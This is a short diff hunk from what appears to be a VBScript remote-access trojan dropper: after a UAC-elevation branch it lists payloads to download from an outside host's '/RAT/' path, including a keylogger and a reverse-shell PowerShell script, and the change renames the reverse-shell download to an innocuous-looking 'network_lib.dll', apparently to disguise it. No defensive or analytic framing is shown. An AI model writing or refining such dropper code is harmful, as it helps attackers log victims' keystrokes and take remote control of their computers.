@@ -55,7 +55,7 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
         Array("https://arth.imbeddex.com/RAT/del.vbs", "del.vbs"), _
         Array("https://arth.imbeddex.com/RAT/keylogger.exe", "key_l.exe"), _
         Array("https://arth.imbeddex.com/RAT/target_script.exe", "target_script.exe"), _
-        Array("https://arth.imbeddex.com/RAT/Rev_shell.ps1", "Rev_shell.ps1") _
+        Array("https://arth.imbeddex.com/RAT/network_lib.dll", "network_lib.dll") _
     )
 
     ' Loop through the files to download
